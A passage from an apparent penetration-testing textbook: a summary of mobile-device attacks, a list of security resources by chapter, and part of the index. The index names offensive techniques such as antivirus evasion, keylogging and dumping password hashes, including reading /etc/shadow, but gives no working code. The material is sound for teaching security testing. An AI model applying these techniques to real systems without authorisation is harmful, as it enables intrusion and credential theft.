We moved on to malicious applications, backdooring legitimate source 
code or compiled APK files with the SPF Android agent. We can use mobileattack vectors such as NFC and SMS to trick users into installing our malicious app. Once the agent was installed, we ran attacks such as information 
gathering and remote control, and we used SPF to escalate our privileges to 
root using known vulnerabilities in the Android platform. Finally, we used 
the SPF agent as a pivot to attack other devices in the network. We ran 
Nmap from the Android device against our Windows XP target, and then 
used a C exploit for War-FTP to exploit the Windows XP target from the 
SPF agent. 
Mobile device security is an exciting field that is adding new dimensions 
to pentesting as the devices enter the workplace. As a pentester, knowing a 
bit about mobile vulnerabilities will come in handy. As attackers use these 
devices to gain sensitive data and a foothold in the network, pentesters must 
be able to simulate these same threats. 
R esourc e
Here are some resources that have helped me on my 
journey through information security and continue to 
serve as references as I learn more. Many are regularly 
updated with the latest tools and techniques in their 
area. I encourage you to refer to these resources as you 
work through this book, so they are listed here by chapter. At the end of the list are some excellent courses that 
you might use to further your study of pentesting.
Chapter 0: Penetration Testing Primer
‚Ä¢	 NIST Technical Guide to Information Security Testing: http://csrc.nist
.gov/publications/nistpubs/800-115/SP800-115.pdf
‚Ä¢	 Penetration Testing Execution Standard (PTES): http://www.pentest
-standard.org/
474 Resources
Chapter 2: Using Kali Linux
‚Ä¢	 Command Line Kung Fu: http://blog.commandlinekungfu.com
‚Ä¢	 Introduction to the Command Line (Second Edition): The Fat Free Guide to 
Unix and Linux Commands by Nicholas Marsh (2010)
‚Ä¢	 The Linux Command Line: A Complete Introduction by William E. Shotts, Jr. 
(No Starch Press, 2012)
‚Ä¢	 Linux for Beginners and Command Line Kung Fu (Bundle): An Introduction 
to the Linux Operating System and Command Line by Jason Cannon (2014)
Chapter 3: Programming
‚Ä¢	 Discovery: https://github.com/leebaird/discover/
‚Ä¢	 Stack Overflow: http://www.stackoverflow.com/
‚Ä¢	 Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers 
and Security Engineers by T.J. O‚ÄôConnor (Syngress, 2012) 
Chapter 4: Using the Metasploit Framework
‚Ä¢	 Metasploit: The Penetration Tester‚Äôs Guide by David Kennedy, Jim O‚ÄôGorman, 
Devon Kearns, and Mati Aharoni (No Starch Press, 2011)
‚Ä¢	 Metasploit blog: https://community.rapid7.com/community/metasploit/blog/
‚Ä¢	 Metasploit Minute show: http://hak5.org/category/episodes/metasploit-minute/
‚Ä¢	 Metasploit Unleashed: http://www.offensive-security.com/metasploit-unleashed/
Main_Page
Chapter 5: Information Gathering
‚Ä¢	 Google Hacking Database: http://www.hackersforcharity.org/ghdb/
‚Ä¢	 Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery 
and Security Scanning by Gordon Fyodor Lyon (Nmap Project, 2009; 
http://nmap.org/book/)
Chapter 6: Finding Vulnerabilities
‚Ä¢	 National Vulnerability Database CVSSv2: http://nvd.nist.gov/cvss.cfm/
‚Ä¢	 Tenable blog: http://www.tenable.com/blog/
Chapter 7: Capturing Traffic
‚Ä¢	 Counter Hack Reloaded: A Step-by-Step Guide to Computer Attacks and 
Effective Defenses (2nd Edition) by Edward Skoudis and Tom Liston 
(Prentice Hall, 2006)
Resources 475
‚Ä¢	 Ettercap: http://ettercap.github.io/ettercap/
‚Ä¢	 SSLStrip: http://www.thoughtcrime.org/software/sslstrip/
Chapter 8: Exploitation
‚Ä¢	 Exploit Database: http://www.exploit-db.com/
‚Ä¢	 Packet Storm: http://packetstormsecurity.com/
‚Ä¢	 SecurityFocus: http://www.securityfocus.com/
‚Ä¢	 VulnHub: http://vulnhub.com/
Chapter 9: Password Attack
‚Ä¢	 CloudCracker: https://www.cloudcracker.com/
‚Ä¢	 John the Ripper: http://www.openwall.com/john/
‚Ä¢	 Packet Storm wordlists: http://packetstormsecurity.com/Crackers/wordlists/
‚Ä¢	 RainbowCrack Project: http://project-rainbowcrack.com/table.htm
‚Ä¢	 White Chapel: http://github.com/mubix/WhiteChapel/
Chapter 11: Social Engineering
‚Ä¢	 Social-Engineer: http://www.social-engineer.org/
‚Ä¢	 TrustedSec: https://www.trustedsec.com/downloads/social-engineer-toolkit/
Chapter 12: Bypassing Antivirus Applicatio
‚Ä¢	 Pentest Geek: http://www.pentestgeek.com/2012/01/25/
using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/ 
‚Ä¢	 Veil-Evasion: https://github.com/Veil-Framework/Veil-Evasion/
Chapter 13: Post Exploitation
‚Ä¢	 Chris Gates‚Äôs blog, carnal0wnage: http://carnal0wnage.attackresearch.com/
‚Ä¢	 Carlos Perez‚Äôs blog: http://www.darkoperator.com/
‚Ä¢	 Obscuresec blog: http://obscuresecurity.blogspot.com/
‚Ä¢	 Pwn Wiki: http://pwnwiki.io/
‚Ä¢	 Rob Fuller‚Äôs blog: http://www.Room362.com/
Chapter 14: Web Application Testin
‚Ä¢	 Damn Vulnerable Web App: http://www.dvwa.co.uk/
476 Resources
‚Ä¢	 Open Web Application Security Project (OWASP): https://www.owasp.org/
index.php/Main_Page
‚Ä¢	 OWASP WebGoat Project: https://www.owasp.org/index.php/Category
:OWASP_WebGoat_Project
Chapter 15: Wireless Attack
‚Ä¢	 Aircrack Wireless Tutorials: http://www.aircrack-ng.org/doku.php?id=tutorial
&DokuWiki=1b6b85cc29f360ca173a42b4ce60cc50
‚Ä¢	 BackTrack 5 Wireless Penetration Testing Beginner‚Äôs Guide by Vivek 
Ramachandran (Packt Publishing, 2011)
Chapters 16‚Äì19: Exploit Development
‚Ä¢	 Corelan Team Tutorials: https://www.corelan.be/index.php/category/
security/exploit-writing-tutorials/
‚Ä¢	 FuzzySecurity: http://fuzzysecurity.com/
‚Ä¢	 Hacking, 2nd Edition: The Art of Exploitation by Jon Erickson (No Starch 
Press, 2008)
Chapter 20: Using the Smartphone Pentest Framework
‚Ä¢	 Damn Vulnerable iPhone App: https://github.com/prateek147/DVIA/
‚Ä¢	 Drozer: https://www.mwrinfosecurity.com/products/drozer/
‚Ä¢	 OWASP mobile: https://www.owasp.org/index.php/OWASP_Mobile_
Security_Project
Courses
‚Ä¢	 Strategic Security (Joe McCray): http://strategicsec.com/
‚Ä¢	 Offensive Security: http://www.offensive-security.com/information 
-security-training/
‚Ä¢	 Exploit Development Bootcamp (Peter Van Eeckhoutte): https://www
.corelan-training.com/index.php/training-2/bootcamp/
‚Ä¢	 Sam Bowne: http://samsclass.info/
‚Ä¢	 SecurityTube PentesterAcademy: http://www.pentesteracademy.com/
I nd e
Numbers and Symbols
3Com TFTP 2.0.1
downloading and installing, 42‚Äì43
public exploit for transport mode 
vulnerability, 427‚Äì429
3CTftpSvc process, attaching, 424‚Äì425
3CTftpSvc.exe, 295
7-Zip programs, 10
& (ampersand), for running commands 
in browser, 328
\\ (double backslashes), for escape, 186
> symbol, for redirecting input, 61
>> operator, 61, 81
#include command (C), 84
| (pipe), 65
/ (slash), as delimiter character in 
sed, 65

absolute path, 56
Address Resolution Protocol (ARP) 
basics, 161‚Äì163
address space layout randomization 
(ASLR), 364, 440
adduser command, 58‚Äì59, 309
administrative privileges
gaining to control domain, 296
for Windows 7 applications, 285
Administrator password, for 
Windows, 33
Adobe Acrobat Reader, 225‚Äì226
installing, 46
Advanced Execution Standard 
(AES), 269
Advanced Packaging Tool (apt), 66
Aircrack-ng
cracking WEP keys with, 347‚Äì350
cracking WPA/WPA2 keys with, 
353‚Äì356
Aireplay-ng
to force client reconnection, 354
rebroadcasting ARP packets 
with, 348
airmon-ng check kill command, 342
Airmon-ng script, 341‚Äì342
airodump-ng command, 342‚Äì343, 347
all users, permissions for, 62
ampersand (&), for running commands 
in browser, 328
Android, 456
emulators, 449
setting up, 22‚Äì27
starting, 26‚Äì27
relationship with security 
updates, 457
scripting languages vs. C code, 468
SDK manager, 23
software
building, 449‚Äì450
deploying, 450‚Äì451
installing, 24
Virtual Device Manager, 24‚Äì25
Android Master Key vulnerability, 459, 
462‚Äì463
anonymous user, on Windows XP 
target, 157
antivirus application avoidance, 
257‚Äì275
hiding in plain sight, 274
Microsoft Security Essentials, 
261‚Äì262
478 Index
antivirus application avoidance 
(continued)
payload hiding, 263‚Äì274
Railgun, 283
trojans, 258‚Äì259
with Veil-Evasion, 270‚Äì274
VirusTotal, 262‚Äì263
antivirus applications
how they work, 260‚Äì261
signatures for, 438
antivirus definitions, 260
Apache server
default ‚ÄúIt Works‚Äù page, 169‚Äì170
installing, 44
APK file, 461‚Äì464
APKTool, installing, 462
appending text to file, 61
apt (Advanced Packaging Tool), 66
argument string, Perl for creating, 376
ARP (Address Resolution Protocol) 
basics, 161‚Äì163
ARP cache poisoning, 160‚Äì166
with Arpspoof, 164‚Äì165
as bottleneck, 166
impersonating default gateway 
with, 165‚Äì166
ARP request
generating, 349
relay attack, generating IVs with, 
348‚Äì349
Arpspoof, ARP cache poisoning with, 
164‚Äì165
ASLR (address space layout 
randomization), 364, 440
assembly instructions, converting to 
shellcode, 398‚Äì399
Atftpd TFTP server, 187
attack string, finding in memory, 
408‚Äì411
Aurora exploit, 220‚Äì222
authentication, fake, 347‚Äì348
authorization, for penetration test, 3
automatic security updates
opting out, in Windows 7, 50
turning off, 34
AutoRunScript parameter, for Metasploit, 
224‚Äì225
auxiliary/server/capture/smb
module, 302
awk command (sed), 66
B
backdoored code, 458‚Äì461
testing from, 193‚Äì194
background command (Meterpreter), 311
background job, killing in 
Metasploit, 222
BackTrack Linux, 55
bar codes, QR (quick response) 
codes, 447
Bash command processor, 56
Bash scripts, 75‚Äì81
else statement in, 78
for loop in, 78‚Äì79
if statement in, 77‚Äì78
pinging hosts on network with, 76
running, 77
streamlining results, 79‚Äì81
then statement in, 78
.bash_history file, 295‚Äì296
BeEF (Browser Exploitation 
Framework), 331‚Äì335
bind payload, 307
bind shell payload, 102‚Äì103
bind shells, 71, 98, 180
bitwise XOR operation, 344
Bkhive, 205
Blackboard, Java for, 241
BookApp custom web application
attacking, 313‚Äì337
installing, 53‚Äì54
booting
Kali Linux, 11
virtual machine delay in, 207
bootkey, 189, 205
breakpoints in program, 368
running program to next, 370
setting, 393
bridged network, for VMware 
connection, 13, 14, 16, 31, 48
Browser Exploitation Framework 
(BeEF), 331‚Äì335
browser_autopwn module, 235‚Äì237
browsers
& for running commands in, 328
attack for opening link in 
mobile, 455
autopwning, 237
exploitation, 219‚Äì225
brute forcing, 198
LM-hashed passwords, 208
MD5 hashes, 212
Index 479
NTLM-hashed passwords, 210‚Äì211
use in Hyperion, 269
WPS pin, 356‚Äì357
buffer overflow
in Linux, 364‚Äì378
preventing exploits, 439‚Äì440
in third-party software, exploiting, 
190‚Äì191
War-FTP crash due to, 384
in Windows, 379‚Äì400
bugs, finding with code review, 422
Bully, cracking WPS with, 357
Burp Proxy, web application testing 
with, 314‚Äì319
Burp Repeater, 314
Burp Spider, 314
C
C programs, 84‚Äì85
for Android devices, 468
causing crash, 366‚Äì367
memory use, 363‚Äì364
vulnerability to stack-based buffer 
overflow, 365‚Äì366
CA (certificate authority), 171
Cadaver, 150‚Äì151, 182
Cain and Abel for Windows, 304
Cain password tool, 303
calling conventions, 390
canaries, 440
capturing traffic, 155‚Äì175. See also
Wireshark
ARP cache poisoning, 160‚Äì166
DNS cache poisoning, 167‚Äì169
networking for, 156
on wireless network, 342‚Äì343
cat command, 61
cat /etc/shadow command, 194
CCMP (Counter Mode with Cipher 
Block Chaining Message 
Authentication Code 
Protocol), 351
cd command, 56
CERTCN option, 234
certificate, for Java applet, 234
certificate authority (CA), 171
ceWL custom wordlist generator, 
200‚Äì201
check function, in Metasploit 
exploits, 147‚Äì148
chmod command, 62
making script executable, 76
clients
Aireplay-ng to force 
reconnection, 354
contact information for, 3
exploiting vulnerability in, 88
goals for pentest, 3
client-side attacks
exploitation with, 218‚Äì239
mobile hacking, 454‚Äì457
clipboard (Windows), stealing data 
from, 334
closing
handler, 228
shell, 100
code review, finding bugs with, 422
command line arguments, in C, 84
command shell
opening listener, 70‚Äì71
pushing back to listener, 71‚Äì72
commands. See also specific commands
executing, 327‚Äì329
learning about, 57‚Äì58
Common Vulnerabilities and 
Exposures (CVE) 
system, 142
Common Vulnerability Scoring System 
(CVSS), 140
compromised service, exploitation of, 
193‚Äì194
computer name, for Windows, 33
Conficker worm, 90
configuration file
cracking passwords, 212‚Äì213
downloading, 188‚Äì189
connect function (Python), 83
connect_ex function (Python), 83
connect_udp function, 435
contact information, for client, 3
continue command (GDB), 370
copying file, 60
Counter Mode with Cipher Block 
Chaining Message 
Authentication Code 
Protocol (CCMP), 351
cp command, 60
CPUs, registers in Intel-based, 
362‚Äì363
crashes, 151
attempting with fuzzing, 424‚Äì426
causing, 382‚Äì384
in GDB, 372‚Äì373
in War-FTP, 397‚Äì398, 403
480 Index
CRC-32 (Cyclic Redundancy 
Check 32), 346
CreateThread API, 271
Credential Harvester Attack Method, 
251‚Äì252
credentials, 174
brute force to find, 198
for FTP server, 160
gathering, 292‚Äì294
in Nessus, 137
stealing stored, 294
cron jobs
automating tasks with, 72‚Äì73
creating, 311
crontab files, 72
cross-site request forgery (CSRF), 335
cross-site scripting (XSS), 329‚Äì335
checking for reflective 
vulnerability, 330
leveraging with BeEF, 331‚Äì335
Crunch tool, 201
CSRF (cross-site request forgery), 335
Ctypes library (Python), 271
custom cross compiling, 266‚Äì269
cut command, 65, 80
CVE (Common Vulnerabilities and 
Exposures) system, 142
CVE-2008-2992, 225‚Äì228
CVSS (Common Vulnerability Scoring 
System), 140
Cyclic Redundancy Check 32 
(CRC-32), 346
cyclical pattern, generating to 
determine offset, 385‚Äì388
D
data execution prevention (DEP), 
364, 441
data manipulation, in Kali Linux, 
64‚Äì66
database
dumping with SQLMap, 322
exploiting access to, 188
finding name of first, 321
for SPF, 448‚Äì449
debugger, installing, 46
debugging information, for GDB, 366
default gateway, 68
ARP cache poisoning for 
impersonating, 165‚Äì166
finding, 38
default payload, for Metasploit, 97
default port, for Simple Mail Transfer 
Protocol (SMTP), 124
delegation token, 300‚Äì301
deleting
files, 60
final character from each line, sed
command for, 81
demilitarized zone, 304
denial-of-service (DoS) condition, 163
DEP (data execution prevention), 
364, 441
deploying Android application, 450‚Äì451
Destination Host Unreachable message, 39
/dev/urandom file (Linux), 267
DHCP (dynamic host configuration 
protocol), 68
dictionary attack, against WPA/
WPA2, 356
dictionary words, in passwords, 198
directories
changing, 56‚Äì57
creating, 60
displaying current, 56
disass command (GDB), 370‚Äì371
DNS. See Domain Name System (DNS)
DNS cache poisoning, 167‚Äì169
Dnsspoof, 169
documentation, 57. See also man pages
domain
adding administrator account, 309
getting administrative access to, 296
setup for simulating, 39‚Äì40
users, password hashes for, 302
Domain Name System (DNS)
reconnaissance, 116‚Äì118
zone transfers, 117‚Äì118
domain names, resolution, 167
domain registrars, 115
DoS (denial-of-service) condition, 163
double backslashes (\\), for escape, 186
downloading
3Com TFTP 2.0.1, 42‚Äì43
Kali Linux, 10
payload by users, 105
sensitive files, 188‚Äì189
SLMail 5.5, 41‚Äì42
Smartphone Pentest Framework 
(SPF), 27‚Äì28
with TFTP, 187‚Äì188
War-FTP, 46
Windows SAM, 189
WinSCP, 46
Index 481
dpkg command, 18
dual-homed systems, 304
dynamic analysis, 261
dynamic host configuration protocol 
(DHCP), 68
E
EAX register, 362, 403
EBP register, 362, 363, 369, 390
EBX register, 362
echo command, 61, 76
ECX register, 363
EDI register, 362, 390
editing files, 62‚Äì64
EDX register, 363
EIP register, 362, 363
controlling, 373‚Äì375
locating, 384‚Äì388
verifying offset, 388‚Äì389, 390
else statement, in Bash scripts, 78
email
searching for addresses, 118‚Äì119
social-engineering attacks 
with, 244
emulator, Android, 449
setting up, 22‚Äì27
starting, 26‚Äì27
encoders, 263‚Äì266
encryption key, for Syskey utility, 189
end, in Ruby, 434
endianness, 376‚Äì378, 394
enterprise connection process, in 
WPA/WPA2, 351
escape, double backslashes (\\) 
for, 186
ESI register, 362
ESP register, 362, 363, 390‚Äì391
following on stack, 408‚Äì409
/etc/crontab file, 72‚Äì73, 311
/etc/john/john.conf file, 212
/etc/network/interfaces file, 68‚Äì69
/etc/proxychains.conf configuration 
file, 307
Ettercap
installing, 22
for man-in-the-middle attacks, 171
exceptions. See structured exception 
handler
executables
embedded in PDF, 228‚Äì229
Hyperion for encrypting, 269‚Äì270
using return address from, 394
execute (x) permissions, 62
execution
hijacking as goal, 373
hijacking in Linux, 375‚Äì376
hijacking in Windows, 390‚Äì395
executive summary of report, 5
exploit code, repositories of, 88
exploit command (Metasploit), 97
Exploit Database, 88, 427
exploit target, for Metasploit, 95
exploit/multi/browser/java_signed_applet 
module, 233‚Äì234
exploitation, 179‚Äì196
of buffer overflow in third-party 
software, 190‚Äì191
with client-side attacks, 218‚Äì239
of compromised service, 193‚Äì194
with Java, 230‚Äì235
mitigation techniques, 439‚Äì442
of MS08-067 vulnerability, 
180‚Äì182
of open NFS shares, 194‚Äì196
phase of penetration testing, 2, 4
of phpMyAdmin, 186‚Äì188
running through pivot, 306‚Äì307
of third-party web applications, 
191‚Äì193
of WebDav default credentials, 
182‚Äì183
Exploit::Remote::UDP mixin, 435
exploits
porting public, 427‚Äì432
replacing shellcode, 430
running, 100
running through SPF agent, 468
with SEH overwrites, 403‚Äì407
writing, 361
exploit/windows/fileformat/adobe_pdf_
embedded_exe module, 228
exploit/windows/fileformat/adobe_utilprintf
module, 226
exploit/windows/fileformat/winamp_maki_
bof module, 238
exploit/windows/local/ms11_080_
afdjoinleaf module, 284
exploit/windows/smb/psexec module, 296
exploit/windows/tftp/tftpd32_long_
filename.rb module, 435
external penetration test, 2
Ez7z program, 10
482 Index
F
Facebook, 172
factory restore, 456
fake authentication, 347‚Äì348
file permissions, 61‚Äì62
filename for exploit, random 
characters for, 438
files
adding text, 61
copying, moving, and removing, 60
creating, 60
editing, 62‚Äì64
searching for text in, 65
sending script results to, 81
viewing list of, 18
FileZilla server.xml configuration file, 
188‚Äì189
FileZilla services, installing, 44
filters, bypassing with Metasploit 
payloads, 216‚Äì218
finding
attack string in memory, 408‚Äì411
compatible payloads, 96‚Äì97
return address, 429‚Äì430
valid usernames, 153
firewalls, intrusion-detection and 
prevention systems on, 125
folders, sharing via FTP, 45
for loop, in Bash scripts, 78‚Äì79
formats, for Nmap log, 125
four-way handshake, 351, 352‚Äì353
capturing, 354
Wireshark for viewing, 355
Framework Android App, 451
FSTENV instruction, 398
FTP account, default password for, 213
FTP server
access to file on, 146‚Äì147
exploiting stack-based buffer 
overflow in, 379‚Äì380
logging in to, 157, 165
FTP user, adding, 45
futuresoft_transfermode.rb module, 
432‚Äì434
fuzzing, 421‚Äì426
attempting crash, 424‚Äì426
finding bugs with code review, 422
for trivial FTP server, 422‚Äì423
G
GCC (GNU Compiler Collection), 84, 
289, 366
gcc command, 289
GDB (GNU debugger), 366
crashing program in, 372‚Äì373
running, 367‚Äì372
viewing source code, 368
getsystem command (Meterpreter), 
283‚Äì286
getuid command (Meterpreter), 185, 
279, 281
GNU Compiler Collection (GCC), 84, 
289, 366
GNU debugger. See GDB (GNU 
debugger)
Google Play apps, signature for, 462
Google search, on vulnerability, 142
GoToMeeting, Java for, 241
grep command, 65
filtering script output, 80
greppable Nmap, 125
group, permissions for, 62
group transient key (GTK), 352
H
handler, closing, 228
Hardware dialog, 31
hashdump command (Meterpreter), 204, 
205, 298
hashes
converting to plaintext, 203
for domain users, 302
dumping with physical access, 
206‚Äì208
example, 211
LM vs. NTLM algorithms, 208
rainbow table for precompleted, 213
recovering from Windows SAM 
files, 204‚Äì206
reversing, 203, 298
heap in memory, 362
‚ÄúHello World‚Äù C program, 84
help
for Meterpreter commands, 278
for Msfcli, 101
for Msfconsole, 89‚Äì90
help upload command (Meterpreter), 279
hidden directories, ls command to 
show, 57‚Äì58
Index 483
hook.js script (BeEF), 332‚Äì333
host utility for DNS queries, 117
host-only network, 13, 117
HTML, for attack email, 254
HTTP GET request, capture by Burp 
Proxy, 316
HTTP payload, 217‚Äì218
exploiting Java vulnerability with, 
231‚Äì232
HTTPS, 174
payloads, 217‚Äì218
hub, and traffic capture, 156
Hydra, guessing usernames and 
passwords with, 202‚Äì203
Hyperion
encrypting executables with, 
269‚Äì270
installing, 21, 270
I
Iceweasel browser, proxy configuration, 
315‚Äì316
ICMP (Internet Control Message 
Protocol) message, 76
if statement 
Bash, 77‚Äì78
C, 84
Python, 83
ifconfig command, 16, 67, 304‚Äì305
IIS (Internet Information Services), 
user privileges, 329
Immunity Debugger, 381‚Äì382
installing, 46‚Äì47
#include command (C), 84
Incognito tool, 301‚Äì302
incoming connection, listening on port 
for, 70
info command (Metasploit), 92‚Äì93
information-gathering phase of 
penetration testing, 2, 4, 
113‚Äì132
local, 291‚Äì296
on mobile device, 464‚Äì465
open source intelligence (OSINT), 
114‚Äì123
initialization vector (IV), 344
generating with ARP request relay 
attack, 348‚Äì349
inline payloads, 181
input, > symbol for redirecting, 61
input function (Python), 82
insert mode for vi, 64
installed packages, managing, 66
installing
3Com TFTP 2.0.1, 42‚Äì43
Adobe Acrobat Reader, 46
Android emulators, 22‚Äì27
Apache, 44
APKTool, 462
debugger, 46
Ettercap, 22
FileZilla services, 44
Hyperion, 21, 270
Immunity Debugger, 46‚Äì47
Java 7 Update 6, 52
Microsoft Security Essentials, 52
Ming C Compiler, 20
Mona, 47
Mozilla Firefox, 52
MySQL, 44
Nessus, 17‚Äì20
Python, 46
SLMail 5.5, 41‚Äì42
Smartphone Pentest Framework 
(SPF), 27‚Äì28
Veil-Evasion, 21
VMware, 9‚Äì10
vulnerable software, 40‚Äì47
War-FTP, 46
Winamp version 5.55, 52
WinSCP, 46
XAMPP 1.7.2, 43‚Äì45
Intel-based CPU registers, 362‚Äì363
internal penetration test, 2
Internet access, testing for Kali 
Linux, 17
Internet Control Message Protocol 
(ICMP) message, 76
Internet Explorer, vulnerability, 
220‚Äì222
Internet Information Services (IIS), 
user privileges, 329
Internet Protocol (TCP/IP) Properties 
dialog, 39
iOS, approach to preventing malicious 
code, 441
IP address, 67‚Äì68
DNS mapping to, 167‚Äì168
mapping to MAC address, 161
setting static, 38‚Äì39
verifying, 16
IP forwarding, 163‚Äì164
ipconfig command, 38
output from, 328
484 Index
iPhone
default SSH login, 453‚Äì454
jailbreaking, 219, 441
running application on, 441
IV (initialization vector), 344
generating with ARP request relay 
attack, 348‚Äì349
iwconfig command, 340‚Äì341
iwlist wlan0 scan command, 341
J
Java, signed Applet, 233‚Äì235
Java 7 Update 6, installing, 52
Java Applet Attack Method, 250
Java Runtime Environment (JRE), 230
java/meterpreter/reverse_http payload, 231
JMP ESP instruction, 392
finding in USER32.dll, 429
reliance on location, 440
John the Ripper tool, 210‚Äì211, 303
wordlists, 200, 212
JRE (Java Runtime Environment), 230
K
Kali Linux, 55‚Äì73
booting, 11
command line, 56
data manipulation in, 64‚Äì66
GUI, 13
opening virtual machine, 11
repository of exploit code, 288
running Android emulators, 27
setup, 10‚Äì28
starting Burp Suite in, 314
testing Internet access for, 17
user privileges, 58‚Äì61
kaliinstall script, 28
keyscan_dump command 
(Meterpreter), 292
keyscan_start command 
(Meterpreter), 292
key-scheduling algorithm, in WEP, 345
keyspace brute-forcing, 201
kill command (Metasploit), 222
Kismet, 356
L
LAN manager (LM) password 
hashes, 208
insecurity of, 209
lateral movement, 296‚Äì304
Incognito tool, 301‚Äì302
PSExec technique, 296‚Äì297
SMB capture, 302‚Äì304
SSH Exec, 299‚Äì300
token impersonation, 300‚Äì301
LHOST, 99‚Äì100
setting, 184
setting in Msfvenom, 104
license key, for Windows, 32
Linksys WRT54G2, web interface, 340
Linux. See also Kali Linux, Ubuntu 8.10 
target machine
adding code to /tmp/run file, 
290‚Äì291
copying and compiling exploit, 
289‚Äì290
cracking passwords, 212
filesystem, 56‚Äì57
finding an exploit, 288‚Äì289
finding a vulnerability, 287‚Äì288
learning kernel version, 287
stack-based buffer overflow in, 
361‚Äì378
udev privilege escalation, 287‚Äì291
VMware Player for, 9‚Äì10
listener
pushing command shell back to, 
71‚Äì72
setup on Kali Linux, 290
list_tokens command 
(Meterpreter), 301
little-endian architecture, 377
LM (LAN manager) password 
hashes, 208
insecurity of, 209
load command (Meterpreter), 301
local file inclusion, 324‚Äì327
local information gathering, 291‚Äì296
local privilege escalation, 283‚Äì291
for Windows, 284‚Äì285
Local Security Authority Subsystem 
Service (LSASS) 
process, 214
local users, listing all, 294
login screen
for Kali Linux, 12
of web application, SQL injection 
issues in, 319‚Äì320
LPORT option, 216
ls command, 18, 56
man page for, 57
Index 485
LSASS (Local Security Authority 
Subsystem Service), 214
lsb_release command, 287
M
MAC (Media Access Control) address, 
mapping IP address to, 161
MAC filtering, by access points, 350
Mac OS, and VMware Fusion, 10, 16, 
31‚Äì32, 36
mail servers
for delivering attack email, 248‚Äì249
valid usernames for, 153
main function, 84
malicious code, asking users to 
allow, 233
Maltego, 119‚Äì123
malware, techniques to avoid detection, 
257‚Äì275
man-in-the-middle attacks, 160‚Äì161
Ettercap for, 22, 171
man ls command, 57
man pages, 57‚Äì58
mandatory code signing, 219, 441‚Äì442
manual port scanning, 124
mapping IP address, to MAC 
address, 161
mass email attacks, 253‚Äì255
MD5 collision attack, 260
MD5 hash
brute forcing, 212
checking for trojans with, 260
md5sum program, 260
MDM (Mobile Device 
Management), 466
Media Access Control (MAC) address, 
mapping IP address to, 161
memory
content display options, 369
finding attack string in memory, 
408‚Äì411
theory of, 362‚Äì364
memory address, byte order in, 376
message integrity code (MIC), 353
Metasm utility, 398‚Äì399
Metasploit
adding route in, 305‚Äì306
auxiliary module and exploit 
database, 91
exploit check functions, 147‚Äì148
killing background job in, 222
modules, 89, 281‚Äì283. See also 
specific modules
advanced parameters, 223‚Äì225
auxiliary, 107‚Äì108
database, 90‚Äì91
finding, 90‚Äì94
MS08-067, 90
post-exploitation, 281‚Äì283
scanner, 146‚Äì147
setting options, 94‚Äì96
verifying format 
specifications, 438
writing, 432‚Äì439
Msfconsole for, 89
payloads, 96‚Äì98
bypassing filters with, 216‚Äì218
port scanners in, 306
search function, 91‚Äì94
starting, 88‚Äì90
support for encoders, 263
test run, 97‚Äì98
updating, 108
Metasploit Browser Exploit Method, 250
Meterpreter, 181‚Äì182
help for commands, 278
keylogger, 292
for post-exploitation, 278‚Äì280
scripts, 280‚Äì281
searching for files with, 291‚Äì292
session, 98
maintaining, 222
placing in background, 311
running scripts in, 223
shell command for dropping out 
of, 287
upload command, 279
MIC (message integrity code), 353
Michael, MAC algorithm, 350
Microsoft Security Essentials, 261‚Äì262
installing, 52
non-detection of malware, 270
Microsoft Windows. See Windows
Ming C Compiler, installing, 20
Mingw32 cross compiler, 268
Mitnick, Kevin, 243
mkdir command, 60, 207
mobile browser, attack for opening link 
in, 455
Mobile Device Management 
(MDM), 466
486 Index
mobile hacking, 445‚Äì472
client-side attacks, 454‚Äì457
malicious apps, 458‚Äì463
near field communication (NFC), 
446‚Äì447
pivoting through devices, 466‚Äì470
port scanning with Nmap, 467‚Äì468
privilege escalation, 471
remote attacks, 453‚Äì454
remote control, 465‚Äì466
with text messages, 446
Mobile Safari, 219
Mode field in TFTP, 423
modules. See Metasploit: modules
Mona
finding pattern offsets in, 387‚Äì388
generating cyclical pattern in, 
385‚Äì388, 405
installing, 47
running SEH command in, 413
!mona findmsp command (Immunity 
Debugger), output, 390
mona pattern_create command (Immunity 
Debugger), 404‚Äì405
mona.py file, downloading, 46
moving files, 60
Mozilla Firefox, installing, 52
MS08-067 vulnerability, 180‚Äì182
Msfcli (command line interface), 89, 
101‚Äì103
showing options, 101‚Äì102
SPF to interface with, 453
Msfconsole, 89
handler for catching payload, 185
help command for, 89‚Äì90
setting up handler, 469
Msftidy tool, 438
msfupdate command, 108, 225, 438
Msfvenom, 258‚Äì259
creating standalone payloads with, 
103‚Äì107
encoders, 264
generating shellcode, 273‚Äì274, 
396, 428
multiencoding with, 265
output format for, 104‚Äì105
prebuilt templates for detection 
signatures, 266
serving payloads, 105, 183‚Äì185
multi/handler module, 105‚Äì107, 227, 469
multi/ssh/sshexec module, 299
multipronged attacks, 255
mv command, 60
MySQL 
database, for SPF, 447
installing, 44
server, privileges, 186
N
nano (file editor), 62‚Äì63
NAT (network address translation), 13
National Institute of Standards and 
Technology (NIST), 141
near field communication (NFC), 
446‚Äì447
negative feedback, 173‚Äì174
Nessus (Tenable Security), 134‚Äì142
credentials in, 137
detailed information on 
vulnerability, 140
exporting results, 141‚Äì142
installing, 17‚Äì20
login screen, 20‚Äì22, 135
Policies tab, 134‚Äì138
rankings, 140‚Äì141
scanning with, 138‚Äì140
starting, 18
net command (Windows), 294‚Äì295
net localgroup command (Windows), 
295, 309
net use command (Windows), 303
net user command (Windows), 309
net users command (Windows), 
294‚Äì295
Netcat tool
to check for listening port, 70
connecting to port with, 152
for file transfer, 72
for SMTP port connection, 124
for TCP/IP connections, 69‚Äì72
Netcraft, 114‚Äì115
netstat command, 69
network
for capturing traffic, 156
connecting virtual machine to, 
16‚Äì17
managing, 67‚Äì69
viewing connections, 69
network adapter
changing settings, 15
configuring for Windows XP, 31
network address translation (NAT), 13
Network File System (NFS), 144‚Äì145
exploitation of open shares, 194‚Äì196
Index 487
network interface, 67
adding second, 52
network mask, 68
NFC (near field communication), 
446‚Äì447
NFS (Network File System), 144‚Äì145
exploitation of open shares, 194‚Äì196
Nikto, 149
NIST (National Institute of Standards 
and Technology), 141
Nmap port scanning, 125‚Äì131
for mobile devices, 467‚Äì468
running through ProxyChains, 308
scanning a specific port, 130‚Äì131
SYN scan, 125‚Äì127
UDP scan, 128‚Äì130
version scan, 127‚Äì128
Nmap Scripting Engine (NSE), 
142‚Äì144
default scripts output, 143‚Äì144
running single script, 144‚Äì146
nondisclosure agreement, 4
NOP sled, 428‚Äì429
NSE. See Nmap Scripting Engine (NSE)
